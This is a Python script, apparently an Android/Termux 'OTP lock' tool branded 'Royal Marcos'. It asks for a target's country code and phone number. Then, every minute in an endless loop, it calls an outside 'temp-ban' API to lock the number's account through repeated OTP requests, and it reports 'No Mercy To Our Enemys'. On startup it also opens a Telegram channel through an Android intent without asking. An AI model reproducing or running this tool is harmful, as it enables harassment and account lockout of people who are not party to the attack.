import requests
import subprocess
import time
import os
from rich.console import Console
from rich.panel import Panel


os.system("clear")
def otp_lock_banner():
    console = Console()

    # Animated colorful text effect
    colors = ["red", "yellow", "green", "cyan", "blue", "magenta"]
    for color in colors:
        console.clear()
        panel = Panel(f'''
[bold {color}]●[bold {colors[(colors.index(color) + 1) % len(colors)]}] ●[bold {colors[(colors.index(color) + 2) % len(colors)]}]     888b     d888         d8888 8888888b.   .d8888b.   .d88888b.   .d8888b. 
   8888b    d8888       d88888 888   Y88b  d88PY88b  d88P" "Y88b  d88PY88b 
   88888b.d8 8888      d88P888 888    888 888    888 888     888  Y88b.      
   888Y88888P 888     d88P 888 888   d88P 888        888     888  "Y888b.   
   888 Y888P  888    d88P  888 8888888P"  888        888     888     "Y88b. 
   888  Y8P   888   d88P   888 888 T88b   888    888 888     888       "888 
   888   "    888  d8888888888 888  T88b  Y88b  d88P Y88b. .d88P   Y88bd88P 
   888        888 d88P     888 888   T88b  "Y8888P"   "Y88888P"   "Y8888P"  
                                                               @modder soulkid                       
                                                                        
                                                                        
[bold {color}]●[bold {colors[(colors.index(color) + 1) % len(colors)]}] ●[bold {colors[(colors.index(color) + 2) % len(colors)]}] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[bold white][[bold red]^[bold white]] [bold green] ❲𓃚⭛ : 𝙍𝙊𝙔𝘼𝙇 𝙈𝘼𝙍𝘾𝙊𝙎 \n[bold white][[bold red]^[bold white]] [bold green] 𝗜𝗚 : royal.m4rcos \n[bold white][[bold red]^[bold white]] [bold green] 𝗧𝗘𝗟𝗘 : https://t.me/royalmarcos
[bold {color}] [bold {colors[(colors.index(color) + 1) % len(colors)]}] [bold {colors[(colors.index(color) + 2) % len(colors)]}]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ''', title="[bold red] 𝗕𝗬 @𝗠𝗢𝗗𝗗𝗘𝗥 𝗦𝗢𝗨𝗟𝗞𝗜𝗗", style=color)
        console.print(panel)
        time.sleep(0.5)

# API function
def temp_ban_api(country_code, phone_number):
    try:
        api_url = f"https://api-bruxiintk.online/api/temp-ban?apikey=bx&ddi={country_code}&numero={phone_number}"
        response = requests.get(api_url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        if response.status_code == 200:
            return "\n\n 𝑂𝑇𝑃 𝐿𝑂𝐶𝐾𝐸𝐷 𝐵𝑌 \n  𝑹𝑶𝒀𝑨𝑳 𝑴𝑨𝑹𝑪𝑶𝑺\n\n 𝑁𝑜 𝑀𝑒𝑟𝑐𝑦 𝑇𝑜 𝑂𝑢𝑟 𝐸𝑛𝑒𝑚𝑦𝑠 𐂂︎ "
        else:
            return "Not done"
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"

def main():
    otp_lock_banner()
    country_code = input("\n\033[90m[\033[91m?\033[90m]] \033[92m[X]𝙀𝙉𝙏𝙀𝙍 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 𝘾𝙊𝘿𝙀 (𝙚𝙜, +𝟵𝟭) : " '\n ❲𓃚⭛ ')
    if not country_code.startswith("+"):
        country_code = "+" + country_code

    phone_number = input("\n\033[90m[\033[91m?\033[90m]] \033[92m[?]𝙀𝙉𝙏𝙀𝙍 𝙉𝙐𝙈𝘽𝙀𝙍 : " '\n ❲𓃚⭛ ')
    phone_number = phone_number.replace(" ", "")  # Remove spaces

    while True:
        result = temp_ban_api(country_code, phone_number)
        print(result)
        time.sleep(60)  # Delay for 1 minute

# Function to print text with delay, bold, and color
def print_with_delay_and_color(text, color_code, bold=True, delay_char=0.03):
    bold_code = "1;" if bold else ""  # Set bold code if bold is True
    for char in text:
        print(f"\033[{bold_code}{color_code}m{char}", end='', flush=True)
        time.sleep(delay_char)
    print("\033[0m", end='', flush=True)

# Function to print a line separator
def print_separator():
    print("\033[1;30m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

# Define lines of text with color and bold settings
lines = [

    ("𝙃𝙀𝙔 𝙐𝙎𝙀𝙍 ", "96", True),
    ("𝙏𝙃𝙄𝙎 𝙏𝙊𝙊𝙇 𝘾𝙍𝙀𝘼𝙏𝙀𝘿 𝘽𝙔 𝙍𝙊𝙔𝘼𝙇 𝙈𝘼𝙍𝘾𝙊𝙎 ", "96", True),
    ("𝙍𝙊𝙔𝘼𝙇 𝙈𝘼𝙍𝘾𝙊𝙎 (𝙏𝙀𝙇𝙀): ", "97", True),
    ("https://t.me/royalmarcos", "91", False),
    ("𝙒𝙀 𝘼𝙍𝙀 𝘼𝙇𝙒𝘼𝙔𝙎 𝙊𝙉 𝙏𝙊𝙋 𐂂︎", "92", True),
    ("𝙈𝘼𝙍𝘾𝙊𝙎 𝙒𝙋 𝙇𝙊𝘾𝙆 𝙏𝙊𝙊𝙇 𝙇𝙊𝘼𝘿𝙄𝙉𝙂...", "90", True)
]

# Print each line with specified color, bold, and delay
for line, color_code, bold in lines:
    print_with_delay_and_color(line, color_code, bold)
    print()
    time.sleep(0.10)  # Add delay between lines

# Wait for 6 seconds
time.sleep(6.0)

# Function to redirect users to a Telegram channel
def redirect_to_telegram_channel(channel_url):
    """
    Redirects the user to a Telegram channel using the provided URL.
    
    Args:
        channel_url (str): The URL of the Telegram channel.
    """
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", channel_url], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

# URL of your Telegram channel
telegram_channel_url = "https://t.me/royalmarcos"

# Redirect users to the Telegram channel
redirect_to_telegram_channel(telegram_channel_url)

if __name__ == "__main__":
    main()
